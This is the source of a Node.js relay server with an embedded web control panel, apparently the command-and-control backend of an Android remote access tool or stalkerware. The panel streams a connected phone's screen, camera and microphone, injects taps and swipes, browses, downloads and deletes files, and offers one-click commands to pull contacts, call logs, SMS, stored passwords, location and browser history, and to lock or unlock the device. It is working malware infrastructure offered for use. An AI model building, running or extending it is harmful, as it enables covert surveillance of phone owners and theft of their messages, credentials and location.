'use strict';
const http = require('http');
const crypto = require('crypto');
const { WebSocketServer } = require('ws');

const PORT   = process.env.PORT || 8080;
const SECRET = process.env.SECRET || '';
const TTL    = 45000;          // ডিভাইস অফলাইন ধরা হবে
const MAXMSG = 8 * 1024 * 1024;

/* kind: 1=screen 2=cam 3=audio 10=up-chunk 11=dl-chunk */

const devices = new Map();     // id -> {id, meta, ws, viewers:Set, last, timer}

const token = () => SECRET ? crypto.createHmac('sha256', SECRET).update('lisa').digest('hex') : '';
const authed = (req) => {
  if (!SECRET) return true;
  const c = req.headers.cookie || '';
  return c.split(';').some(p => p.trim() === 'lisa=' + token());
};

const html = (s) => s;

/* ---------------- device registry ---------------- */

function reg(id, ws, meta) {
  const old = devices.get(id);
  if (old) { try { old.ws.close(); } catch (_) {} clearTimeout(old.timer); }
  const d = { id, ws, meta, viewers: new Set(), last: Date.now(), timer: null };
  devices.set(id, d);
  arm(d);
  pushList();
  console.log('+ device', id, meta.name);
  return d;
}

function arm(d) {
  clearTimeout(d.timer);
  d.timer = setTimeout(() => {
    if (Date.now() - d.last > TTL) drop(d, 'timeout');
    else arm(d);
  }, 5000);
}

function drop(d, why) {
  clearTimeout(d.timer);
  if (devices.get(d.id) === d) devices.delete(d.id);
  for (const v of d.viewers) { try { v.send(JSON.stringify({ t: 'detach', why })); } catch (_) {} }
  try { d.ws.close(); } catch (_) {}
  pushList();
  console.log('- device', d.id, why);
}

function pushList() {
  const list = [...devices.values()].map(d => ({
    id: d.id, name: d.meta.name, brand: d.meta.brand,
    android: d.meta.android, batt: d.meta.batt,
    viewers: d.viewers.size, last: d.last
  }));
  const msg = JSON.stringify({ t: 'devices', list });
  for (const d of devices.values())
    for (const v of d.viewers) { try { v.send(msg); } catch (_) {} }
}

/* ---------------- http ---------------- */

const server = http.createServer((req, res) => {
  const u = new URL(req.url, 'http://x');

  if (u.pathname === '/healthz') { res.writeHead(200); return res.end('ok'); }

  if (u.pathname === '/login' && req.method === 'POST') {
    let b = '';
    req.on('data', c => b += c);
    req.on('end', () => {
      const k = new URLSearchParams(b).get('key') || '';
      if (k !== SECRET) { res.writeHead(302, { Location: '/?bad=1' }); return res.end(); }
      res.writeHead(302, {
        'Set-Cookie': `lisa=${token()}; Path=/; HttpOnly; SameSite=Lax; Max-Age=2592000`,
        Location: '/'
      });
      res.end();
    });
    return;
  }

  if (u.pathname === '/api/devices') {
    if (!authed(req)) { res.writeHead(401); return res.end('{}'); }
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify([...devices.values()].map(d => ({
      id: d.id, name: d.meta.name, brand: d.meta.brand,
      android: d.meta.android, batt: d.meta.batt, viewers: d.viewers.size
    }))));
  }

  if (u.pathname !== '/') { res.writeHead(404); return res.end('404'); }

  if (!authed(req)) {
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    return res.end(LOGIN);
  }
  res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
  res.end(PAGE);
});

/* ---------------- ws ---------------- */

const wss = new WebSocketServer({ noServer: true, maxPayload: MAXMSG });

server.on('upgrade', (req, sock, head) => {
  const u = new URL(req.url, 'http://x');
  if (u.pathname !== '/ws') return sock.destroy();

  const role = u.searchParams.get('role');
  if (role === 'viewer') {
    if (!authed(req)) return sock.destroy();
  } else if (role === 'device') {
    if (SECRET && u.searchParams.get('key') !== SECRET) return sock.destroy();
  } else return sock.destroy();

  wss.handleUpgrade(req, sock, head, ws => wss.emit('connection', ws, req, u, role));
});

wss.on('connection', (ws, req, u, role) => {
  ws.bin = true;
  if (role === 'device') {
    const id = (u.searchParams.get('id') || '').slice(0, 40);
    if (!id) return ws.close();
    const d = reg(id, ws, {
      name: (u.searchParams.get('name') || '?').slice(0, 60),
      brand: (u.searchParams.get('brand') || '').slice(0, 40),
      android: (u.searchParams.get('android') || '').slice(0, 8),
      batt: (u.searchParams.get('batt') || '').slice(0, 8)
    });
    ws.on('message', (data, bin) => {
      d.last = Date.now();
      for (const v of d.viewers) {
        if (v.readyState === 1) { try { v.send(data, { binary: bin }); } catch (_) {} }
      }
    });
    ws.on('close', () => { if (devices.get(id) === d) drop(d, 'closed'); });
    ws.on('error', () => {});
    ws.on('pong', () => { d.last = Date.now(); });
    return;
  }

  /* viewer */
  let cur = null;
  const send = (o) => { if (ws.readyState === 1) ws.send(JSON.stringify(o)); };

  send({ t: 'devices', list: [...devices.values()].map(d => ({
    id: d.id, name: d.meta.name, brand: d.meta.brand,
    android: d.meta.android, batt: d.meta.batt, viewers: d.viewers.size })) });

  ws.on('message', (data, bin) => {
    if (bin) {
      if (cur && cur.ws.readyState === 1) { try { cur.ws.send(data, { binary: true }); } catch (_) {} }
      return;
    }
    let m;
    try { m = JSON.parse(data.toString()); } catch (_) { return; }

    if (m.t === 'attach') {
      const d = devices.get(m.id);
      if (!d) return send({ t: 'err', v: 'device offline' });
      if (cur && cur !== d) { cur.viewers.delete(ws); }
      cur = d;
      d.viewers.add(ws);
      d.ws.send(JSON.stringify({ t: 'attach', n: d.viewers.size }));
      send({ t: 'attached', id: d.id, name: d.meta.name, meta: d.meta });
      return;
    }
    if (m.t === 'detach') {
      if (cur) { cur.viewers.delete(ws); try { cur.ws.send(JSON.stringify({ t: 'attach', n: cur.viewers.size })); } catch (_) {} }
      cur = null;
      return;
    }
    if (!cur) return send({ t: 'err', v: 'not attached' });
    cur.last = Date.now();
    try { cur.ws.send(JSON.stringify(m)); } catch (_) {}
  });

  ws.on('close', () => {
    if (cur) { cur.viewers.delete(ws); try { cur.ws.send(JSON.stringify({ t: 'attach', n: cur.viewers.size })); } catch (_) {} }
  });
  ws.on('error', () => {});
});

setInterval(() => {
  for (const ws of wss.clients) if (ws.readyState === 1) { try { ws.ping(); } catch (_) {} }
}, 25000);

/* ---------------- pages ---------------- */

const LOGIN = `<!doctype html><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1">
<title>lisa</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{background:#070a10;color:#dbe6f7;font-family:-apple-system,Roboto,sans-serif;
display:flex;align-items:center;justify-content:center;height:100vh}
form{background:#0d121c;border:1px solid #1b2432;border-radius:18px;padding:28px;width:300px}
h1{font-size:13px;letter-spacing:.2em;color:#5fa8ff;margin-bottom:18px;text-align:center}
input{width:100%;padding:13px;border-radius:11px;border:1px solid #1b2432;background:#04070c;
color:#fff;font-size:15px;outline:none;margin-bottom:12px}
button{width:100%;padding:13px;border-radius:11px;border:0;background:#3b82f6;color:#fff;
font-size:14px;font-weight:600}
.bad{color:#fca5a5;font-size:11px;text-align:center;margin-top:10px}
</style>
<form method=post action=/login>
<h1>LISA RELAY</h1>
<input name=key type=password placeholder="access key" autofocus>
<button>Enter</button>
<p class=bad>${'' }</p>
</form>`;

const PAGE = `<!doctype html><meta charset=utf-8>
<meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>lisa relay</title>
<style>
*{box-sizing:border-box;margin:0;padding:0;-webkit-tap-highlight-color:transparent}
:root{--bg:#070a10;--pan:#0d121c;--ln:#1b2432;--tx:#dbe6f7;--dim:#7b8aa3;--ac:#3b82f6;
--ok:#22c55e;--rd:#ef4444}
body{background:var(--bg);color:var(--tx);font-family:-apple-system,Roboto,sans-serif;
font-size:14px;height:100vh;display:flex;flex-direction:column;overflow:hidden}
#top{height:50px;flex:0 0 50px;display:flex;align-items:center;gap:8px;padding:0 10px;
background:#080b12;border-bottom:1px solid var(--ln)}
#ttl{flex:1;font-size:12px;font-weight:700;letter-spacing:.12em;color:#5fa8ff;
white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
#dot{font-size:10px;padding:5px 9px;border-radius:20px;background:#ffffff0f;
border:1px solid var(--ln);color:var(--dim)}
.ib{width:32px;height:32px;flex:0 0 32px;border-radius:9px;border:1px solid var(--ln);
background:#ffffff0d;color:var(--tx);font-size:14px;display:flex;align-items:center;
justify-content:center;cursor:pointer}
.ib:active{background:var(--ac)}
#main{flex:1;display:flex;min-height:0}
#side{width:250px;flex:0 0 250px;border-right:1px solid var(--ln);overflow-y:auto;
background:#080b12}
#side.hide{display:none}
.dv{padding:11px 12px;border-bottom:1px solid #131a26;cursor:pointer}
.dv:active,.dv.on{background:#132033}
.dv .n{font-size:13px;font-weight:600;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.dv .s{font-size:10px;color:var(--dim);margin-top:3px}
#pane{flex:1;display:flex;flex-direction:column;min-width:0}
#tabs{display:flex;gap:4px;padding:7px;background:#080b12;border-bottom:1px solid var(--ln);
overflow-x:auto}
.tb{padding:8px 12px;border-radius:9px;border:1px solid var(--ln);background:#ffffff0d;
color:var(--tx);font-size:12px;white-space:nowrap;cursor:pointer}
.tb.on{background:var(--ac);border-color:var(--ac)}
#body{flex:1;overflow:auto;position:relative;min-height:0}
.stage{height:100%;display:flex;align-items:center;justify-content:center;background:#000;
position:relative}
#cv{max-width:100%;max-height:100%;touch-action:none;display:block}
#cam{max-width:100%;max-height:100%;object-fit:contain}
#bar{display:flex;gap:5px;padding:7px;background:#080b12;border-top:1px solid var(--ln);
flex-wrap:wrap}
.b{flex:1;min-width:44px;height:42px;border-radius:11px;border:1px solid var(--ln);
background:#ffffff0d;color:var(--tx);font-size:14px;display:flex;align-items:center;
justify-content:center;cursor:pointer}
.b:active{background:var(--ac)}
.b.on{background:var(--ok);border-color:var(--ok);color:#04240f}
.pad{padding:12px}
.row{display:flex;align-items:center;gap:8px;padding:10px 8px;border-radius:10px;cursor:pointer}
.row:active{background:#ffffff12}
.rn{flex:1;overflow:hidden;white-space:nowrap;text-overflow:ellipsis;font-size:13px}
.rs{font-size:10px;color:var(--dim);flex:0 0 auto}
.ic{width:28px;height:28px;flex:0 0 28px;border-radius:8px;background:#ffffff0f;
display:flex;align-items:center;justify-content:center;font-size:13px}
.del{width:28px;height:28px;flex:0 0 28px;border-radius:8px;background:#ef444426;
color:#fca5a5;display:flex;align-items:center;justify-content:center;font-size:12px}
#fbar{display:flex;gap:6px;padding:7px;border-bottom:1px solid var(--ln);background:var(--pan)}
#fpath{flex:1;font-size:11px;color:var(--dim);align-self:center;overflow:hidden;
white-space:nowrap;text-overflow:ellipsis;direction:rtl;text-align:left}
pre{font-family:ui-monospace,monospace;font-size:11.5px;line-height:1.55;padding:12px;
white-space:pre-wrap;word-break:break-word;color:#c7d5ea}
#log{padding:0}
#log .e{border-bottom:1px solid #131a26;padding:10px 12px}
#log .k{font-size:10px;color:#5fa8ff;margin-bottom:5px;letter-spacing:.08em}
#cin{display:flex;gap:6px;padding:8px;border-top:1px solid var(--ln);background:#080b12}
#cin input{flex:1;padding:11px;border-radius:10px;border:1px solid var(--ln);background:#04070c;
color:#fff;font-size:14px;outline:none}
#qk{display:flex;gap:5px;flex-wrap:wrap;padding:8px;border-top:1px solid var(--ln);
background:#080b12;max-height:130px;overflow-y:auto}
.q{font-size:11px;padding:7px 10px;border-radius:9px;border:1px solid var(--ln);
background:#ffffff0d;cursor:pointer;white-space:nowrap}
.q:active{background:var(--ac)}
#toast{position:fixed;left:50%;transform:translateX(-50%);bottom:70px;padding:9px 15px;
border-radius:11px;background:#141a26f7;border:1px solid var(--ln);font-size:12px;
opacity:0;transition:.2s;z-index:80;pointer-events:none}
#toast.on{opacity:1}
.info{font-size:12px;line-height:1.9;padding:14px;color:var(--dim)}
.info b{color:var(--tx)}
#modal{position:fixed;inset:0;background:#000000f2;z-index:70;display:none;
flex-direction:column;align-items:center;justify-content:center;padding:14px}
#modal.on{display:flex}
#modal img,#modal video{max-width:100%;max-height:82%;border-radius:10px}
#modal audio{width:100%;max-width:420px}
#mx{position:absolute;top:14px;right:14px;width:38px;height:38px;border-radius:11px;
background:#ffffff1a;border:1px solid var(--ln);color:#fff;font-size:17px;display:flex;
align-items:center;justify-content:center;cursor:pointer}
</style>

<div id=top>
  <div class=ib id=burger>☰</div>
  <div id=ttl>lisa relay</div>
  <div id=dot>—</div>
  <div class=ib id=shot>📸</div>
  <div class=ib id=reload>⟳</div>
</div>

<div id=main>
  <div id=side></div>
  <div id=pane>
    <div id=tabs>
      <div class="tb on" data-v=screen>Screen</div>
      <div class=tb data-v=camera>Camera</div>
      <div class=tb data-v=audio>Audio</div>
      <div class=tb data-v=files>Files</div>
      <div class=tb data-v=info>Info</div>
      <div class=tb data-v=console>Console</div>
    </div>
    <div id=body></div>
  </div>
</div>

<div id=modal><div id=mx>✕</div><div id=mb></div></div>
<div id=toast></div>

<script>
const $ = s => document.querySelector(s);
const dot = $('#dot'), body = $('#body'), side = $('#side');
let ws, cur = null, devs = [], view = 'screen';
let screenOn = false, camOn = false, audioOn = false, actx = null, apos = 0, aseq = 0;
let curPath = '', curUp = '', camFront = 1;
const dl = new Map(), ul = new Map();
let pulse = null;

const toast = m => { const t = $('#toast'); t.textContent = m; t.classList.add('on');
  clearTimeout(t._h); t._h = setTimeout(() => t.classList.remove('on'), 1700); };

const b64e = s => btoa(String.fromCharCode(...new TextEncoder().encode(s)))
  .replace(/\\+/g,'-').replace(/\\//g,'_').replace(/=+$/,'');
const b64u = s => new TextDecoder().decode(Uint8Array.from(
  atob(s.replace(/-/g,'+').replace(/_/g,'/')), c => c.charCodeAt(0)));
const fmt = n => n < 1024 ? n + ' B' : n < 1048576 ? (n/1024|0) + ' KB'
  : n < 1073741824 ? (n/1048576).toFixed(1) + ' MB' : (n/1073741824).toFixed(2) + ' GB';
const esc = s => String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');

function tx(o) { if (ws && ws.readyState === 1) ws.send(JSON.stringify(o)); }
function bin(kind, buf) {
  if (!ws || ws.readyState !== 1) return;
  const out = new Uint8Array(buf.byteLength + 1);
  out[0] = kind; out.set(new Uint8Array(buf), 1);
  ws.send(out.buffer);
}

/* ---------- socket ---------- */

function conn() {
  ws = new WebSocket((location.protocol === 'https:' ? 'wss://' : 'ws://') + location.host + '/ws?role=viewer');
  ws.binaryType = 'arraybuffer';
  ws.onopen = () => { dot.textContent = '● online'; dot.style.color = '#22c55e';
    if (cur) tx({ t: 'attach', id: cur }); };
  ws.onmessage = onMsg;
  ws.onclose = () => { dot.textContent = '● lost'; dot.style.color = '#ef4444';
    setTimeout(conn, 1500); };
  ws.onerror = () => {};
}

function onMsg(e) {
  if (typeof e.data === 'string') {
    let m; try { m = JSON.parse(e.data); } catch (_) { return; }
    handle(m);
    return;
  }
  const a = new Uint8Array(e.data);
  const kind = a[0], pay = a.subarray(1);
  if (kind === 1) drawScreen(pay);
  else if (kind === 2) drawCam(pay);
  else if (kind === 3) playPcm(pay);
  else if (kind === 11) gotChunk(pay);
}

function handle(m) {
  if (m.t === 'devices') { devs = m.list; renderList(); return; }
  if (m.t === 'attached') {
    cur = m.id; $('#ttl').textContent = m.name || m.id;
    renderList();
    return;
  }
  if (m.t === 'detach') { toast('device ' + (m.why || 'gone')); return; }
  if (m.t === 'text') { log('reply', m.v || ''); return; }
  if (m.t === 'dl_begin') { dl.set(m.tid, { n: m.n, parts: [] }); return; }
  if (m.t === 'dl_end') {
    const t = dl.get(m.tid); dl.delete(m.tid);
    if (!t) return;
    const blob = new Blob(t.parts, { type: m.mime || 'application/octet-stream' });
    if (m.inline) { showModal(blob, m.n, m.mime); }
    else { const a2 = document.createElement('a');
      a2.href = URL.createObjectURL(blob); a2.download = t.n; a2.click();
      setTimeout(() => URL.revokeObjectURL(a2.href), 20000); toast('saved ' + t.n); }
    return;
  }
  if (m.t === 'fs_list') { renderFiles(m); return; }
  if (m.t === 'dev_info') { renderInfo(m); return; }
  if (m.t === 'up_ok') { toast('uploaded ' + m.n); load(curPath); return; }
  if (m.t === 'err') { toast(m.v || 'error'); return; }
}

/* ---------- device list ---------- */

function renderList() {
  side.innerHTML = '';
  if (!devs.length) { side.innerHTML = '<div class=pad style="color:#7b8aa3;font-size:12px">no devices online</div>'; return; }
  devs.forEach(d => {
    const el = document.createElement('div');
    el.className = 'dv' + (d.id === cur ? ' on' : '');
    el.innerHTML = '<div class=n>' + esc(d.name) + '</div><div class=s>' +
      esc(d.brand || '') + ' · SDK ' + esc(d.android) + ' · ' + esc(d.batt) + '% · ' +
      d.viewers + ' viewer</div>';
    el.onclick = () => { cur = d.id; tx({ t: 'attach', id: d.id }); renderList(); };
    side.appendChild(el);
  });
}

/* ---------- tabs ---------- */

document.querySelectorAll('.tb').forEach(t => t.onclick = () => go(t.dataset.v));

function go(v) {
  document.querySelectorAll('.tb').forEach(t => t.classList.toggle('on', t.dataset.v === v));
  view = v;
  if (v !== 'screen' && screenOn) { screenOn = false; tx({ t: 'screen', on: false }); }
  if (v !== 'camera' && camOn) { camOn = false; tx({ t: 'cam', on: false }); }
  if (v !== 'audio' && audioOn) { audioOn = false; tx({ t: 'audio', on: false }); }
  clearInterval(pulse); pulse = null;
  if (!cur) { body.innerHTML = '<div class=pad style="color:#7b8aa3">select a device first</div>'; return; }
  if (v === 'screen') buildScreen();
  else if (v === 'camera') buildCam();
  else if (v === 'audio') buildAudio();
  else if (v === 'files') { curPath = ''; buildFiles(); }
  else if (v === 'info') buildInfo();
  else buildConsole();
}

/* ---------- screen ---------- */

function buildScreen() {
  body.innerHTML = '<div class=stage><canvas id=cv width=540 height=1170></canvas></div>' +
    '<div id=bar>' +
    '<div class=b data-k=back>◀</div><div class=b data-k=home>⌂</div>' +
    '<div class=b data-k=recents>▣</div><div class=b data-k=notif>🔔</div>' +
    '<div class=b data-k=del>⌫</div><div class=b data-k=lock>🔒</div>' +
    '<div class=b data-k=enter>↵</div></div>';
  body.querySelectorAll('.b').forEach(b => b.onclick = () => tx({ t: 'input', v: { t: 'key', k: b.dataset.k } }));
  const cv = $('#cv'), cx = cv.getContext('2d');
  let pd = false, sx = 0, sy = 0, st = 0, moved = false;
  const rel = e => { const r = cv.getBoundingClientRect();
    return { x: (e.clientX - r.left) / r.width, y: (e.clientY - r.top) / r.height }; };
  cv.addEventListener('pointerdown', e => { e.preventDefault(); pd = true; moved = false;
    const p = rel(e); sx = p.x; sy = p.y; st = Date.now(); cv.setPointerCapture(e.pointerId); });
  cv.addEventListener('pointermove', e => { if (!pd) return; const p = rel(e);
    if (Math.abs(p.x - sx) > .02 || Math.abs(p.y - sy) > .02) moved = true; });
  cv.addEventListener('pointerup', e => { if (!pd) return; pd = false; const p = rel(e);
    if (!moved || Date.now() - st < 130) tx({ t: 'input', v: { t: 'tap', x: p.x, y: p.y } });
    else tx({ t: 'input', v: { t: 'swipe', x1: sx, y1: sy, x2: p.x, y2: p.y,
      ms: Math.min(600, Math.max(120, Date.now() - st)) } }); });
  screenOn = true;
  tx({ t: 'screen', on: true, q: 60, fps: 4 });
}

function drawScreen(pay) {
  const cv = $('#cv'); if (!cv) return;
  const u = URL.createObjectURL(new Blob([pay], { type: 'image/jpeg' }));
  const im = new Image();
  im.onload = () => {
    if (cv.width !== im.naturalWidth) { cv.width = im.naturalWidth; cv.height = im.naturalHeight; }
    cv.getContext('2d').drawImage(im, 0, 0);
    URL.revokeObjectURL(u);
  };
  im.src = u;
}

/* ---------- camera ---------- */

function buildCam() {
  body.innerHTML = '<div class=stage><img id=cam alt=""><div id=cmsg ' +
    'style="position:absolute;color:#7b8aa3;font-size:12px">starting…</div></div>' +
    '<div id=bar><div class="b on" id=fr>🤳</div><div class=b id=bk>📷</div>' +
    '<div class=b id=cmic>🎤</div><div class=b id=cshot>📸</div></div>';
  $('#fr').onclick = () => { camFront = 1; tx({ t: 'cam', on: true, front: 1 });
    $('#fr').classList.add('on'); $('#bk').classList.remove('on'); };
  $('#bk').onclick = () => { camFront = 0; tx({ t: 'cam', on: true, front: 0 });
    $('#bk').classList.add('on'); $('#fr').classList.remove('on'); };
  $('#cmic').onclick = () => { const on = !$('#cmic').classList.contains('on');
    $('#cmic').classList.toggle('on', on); tx({ t: 'audio', on }); audioOn = on; };
  $('#cshot').onclick = shot;
  camOn = true;
  tx({ t: 'cam', on: true, front: camFront });
}

function drawCam(pay) {
  const el = $('#cam'); if (!el) return;
  const u = URL.createObjectURL(new Blob([pay], { type: 'image/jpeg' }));
  const old = el.src;
  el.onload = () => { if (old && old.startsWith('blob:')) URL.revokeObjectURL(old); };
  el.src = u;
  const m = $('#cmsg'); if (m) m.style.display = 'none';
}

/* ---------- audio ---------- */

function buildAudio() {
  body.innerHTML = '<div class=pad><div class=b id=am style="max-width:180px;margin:auto">' +
    '🎤 Start listening</div><pre id=alog style="margin-top:14px"></pre></div>';
  $('#am').onclick = () => {
    const on = !audioOn;
    audioOn = on;
    $('#am').classList.toggle('on', on);
    $('#am').textContent = on ? '🎤 Listening' : '🎤 Start listening';
    tx({ t: 'audio', on });
    if (on) { if (!actx) try { actx = new AudioContext({ sampleRate: 16000 }); } catch (_) {}
      if (actx && actx.state === 'suspended') actx.resume(); apos = 0; }
  };
}

function playPcm(pay) {
  try {
    if (!actx) return;
    const n = pay.length >> 1; if (!n) return;
    const f = new Float32Array(n);
    const dv = new DataView(pay.buffer, pay.byteOffset, pay.byteLength);
    for (let i = 0; i < n; i++) f[i] = dv.getInt16(i * 2, true) / 32768;
    const b = actx.createBuffer(1, n, 16000);
    b.copyToChannel(f, 0);
    const s = actx.createBufferSource();
    s.buffer = b; s.connect(actx.destination);
    const now = actx.currentTime; if (apos < now) apos = now;
    s.start(apos); apos += b.duration;
  } catch (_) {}
}

/* ---------- files ---------- */

function buildFiles() {
  body.innerHTML = '<div id=fbar><div class=ib id=up>⬆</div><div id=fpath>/</div>' +
    '<div class=ib id=mk>➕</div><label class=ib for=fup>📤</label></div>' +
    '<input id=fup type=file multiple style="display:none"><div id=flist class=pad></div>';
  $('#up').onclick = () => { if (curUp) load(curUp); };
  $('#mk').onclick = () => { const n = prompt('folder name'); if (!n) return;
    tx({ t: 'fs_mkdir', p: curPath, n }); setTimeout(() => load(curPath), 700); };
  $('#fup').onchange = e => upload(e.target.files, e.target);
  load('');
}

function load(p) {
  tx({ t: 'fs_list', p: p || '' });
}

function renderFiles(m) {
  if (m.err) { toast('cannot open'); return; }
  curPath = m.p; curUp = m.up || '';
  $('#fpath').textContent = m.path;
  const box = $('#flist');
  box.innerHTML = '';
  if (!m.items.length) { box.innerHTML = '<div style="color:#7b8aa3">empty folder</div>'; return; }
  m.items.forEach(it => {
    const row = document.createElement('div');
    row.className = 'row';
    const ic = document.createElement('div');
    ic.className = 'ic';
    ic.textContent = it.d ? '📁' : it.i ? '🖼' : it.v ? '🎬' : it.a ? '🎵' : '📄';
    const nm = document.createElement('div');
    nm.className = 'rn'; nm.textContent = it.n;
    const sz = document.createElement('div');
    sz.className = 'rs'; sz.textContent = it.d ? '' : fmt(it.s);
    const del = document.createElement('div');
    del.className = 'del'; del.textContent = '🗑';
    del.onclick = ev => { ev.stopPropagation();
      if (!confirm('Delete ' + it.n + ' ?')) return;
      tx({ t: 'fs_del', p: it.p }); setTimeout(() => load(curPath), 700); };
    row.append(ic, nm, sz, del);
    row.onclick = () => {
      if (it.d) load(it.p);
      else if (it.i || it.v || it.a) tx({ t: 'fs_get', p: it.p, inline: true });
      else tx({ t: 'fs_get', p: it.p });
    };
    box.appendChild(row);
  });
}

function upload(files, input) {
  const arr = [...files];
  let i = 0;
  (function next() {
    if (i >= arr.length) { input.value = ''; load(curPath); return; }
    const f = arr[i++];
    const tid = Date.now() + '_' + i;
    tx({ t: 'up_begin', tid, p: curPath, n: f.name, size: f.size });
    const CH = 65536;
    let off = 0;
    const rd = new FileReader();
    rd.onload = () => {
      bin(10, rd.result);
      off += CH;
      if (off < f.size) slice();
      else { tx({ t: 'up_end', tid, p: curPath, n: f.name }); next(); }
    };
    function slice() { rd.readAsArrayBuffer(f.slice(off, off + CH)); }
    slice();
  })();
}

function gotChunk(pay) {
  for (const [, t] of dl) { t.parts.push(pay.slice()); }
}

function showModal(blob, name, mime) {
  const u = URL.createObjectURL(blob);
  const mb = $('#mb');
  mb.innerHTML = '';
  if ((mime || '').startsWith('video')) {
    mb.innerHTML = '<video src="' + u + '" controls autoplay playsinline></video>';
  } else if ((mime || '').startsWith('audio')) {
    mb.innerHTML = '<audio src="' + u + '" controls autoplay></audio>';
  } else {
    mb.innerHTML = '<img src="' + u + '">';
  }
  $('#modal').classList.add('on');
}

/* ---------- info ---------- */

function buildInfo() {
  body.innerHTML = '<div class=info id=ib>loading…</div>';
  tx({ t: 'dev_info' });
}

function renderInfo(m) {
  const el = $('#ib'); if (!el) return;
  el.innerHTML =
    '<b>Model</b><br>' + esc(m.model) + '<br><br><b>Brand</b><br>' + esc(m.brand) +
    '<br><br><b>Android</b><br>' + esc(m.android) + '<br><br><b>Battery</b><br>' +
    esc(m.batt) + '%<br><br><b>Free</b><br>' + esc(m.free) +
    '<br><br><b>Accessibility</b><br>' + (m.acc ? '✅' : '❌') +
    '<br><br><b>Camera</b><br>' + (m.cam ? '✅' : '❌') +
    '<br><br><b>Mic</b><br>' + (m.mic ? '✅' : '❌') +
    '<br><br><b>Locked</b><br>' + (m.locked ? '✅' : '❌') +
    '<br><br><b>Web (LAN)</b><br>' + esc(m.web || 'off');
}

/* ---------- console ---------- */

function buildConsole() {
  body.innerHTML = '<div id=log></div>';
  $('#pane').insertAdjacentHTML('beforeend',
    '<div id=qk></div><div id=cin><input id=tx placeholder="command…"><div class=b id=send>↵</div></div>');
  const qk = $('#qk');
  [['/info','Info'],['/contacts','Contacts'],['/calls','Call log'],['/sms','SMS'],
   ['/passwords','Vault'],['/checkpermission','Perms'],['/location','Location'],
   ['/wifi_info','WiFi'],['/scan_networks','Scan'],['/apps','Apps'],
   ['/battery','Battery'],['/usage_analytics','Usage'],['/browser_history','History'],
   ['/screenshot','Shot'],['/lock','Lock'],['/unlock','Unlock'],['/mute_on','Mute'],
   ['/mute_off','Unmute'],['/touch_on','Torch on'],['/touch_off','Torch off'],
   ['/device_zip','ZIP'],['/rec_30','Rec 30s'],['/screen_capture_off','Stop rec']
  ].forEach(([c, l]) => {
    const b = document.createElement('div');
    b.className = 'q'; b.textContent = l;
    b.onclick = () => send(c);
    qk.appendChild(b);
  });
  const inp = $('#tx');
  inp.addEventListener('keydown', e => { if (e.key === 'Enter') send(inp.value); });
  $('#send').onclick = () => send(inp.value);
  function send(v) { if (!v) return; log('>', v); tx({ t: 'cmd', v }); inp.value = ''; }
}

function log(kind, text) {
  const l = $('#log'); if (!l) return;
  const e = document.createElement('div');
  e.className = 'e';
  e.innerHTML = '<div class=k>' + esc(kind) + '</div><pre>' + esc(text) + '</pre>';
  l.appendChild(e);
  body.scrollTop = body.scrollHeight;
}

/* ---------- misc ---------- */

function shot() { tx({ t: 'shot' }); toast('screenshot…'); }

$('#shot').onclick = shot;
$('#reload').onclick = () => location.reload();
$('#burger').onclick = () => side.classList.toggle('hide');
$('#mx').onclick = () => { $('#modal').classList.remove('on'); $('#mb').innerHTML = ''; };

window.addEventListener('pagehide', () => {
  if (screenOn) tx({ t: 'screen', on: false });
  if (camOn) tx({ t: 'cam', on: false });
  if (audioOn) tx({ t: 'audio', on: false });
});

conn();
</script>`;

server.listen(PORT, '0.0.0.0', () => console.log('relay on ' + PORT));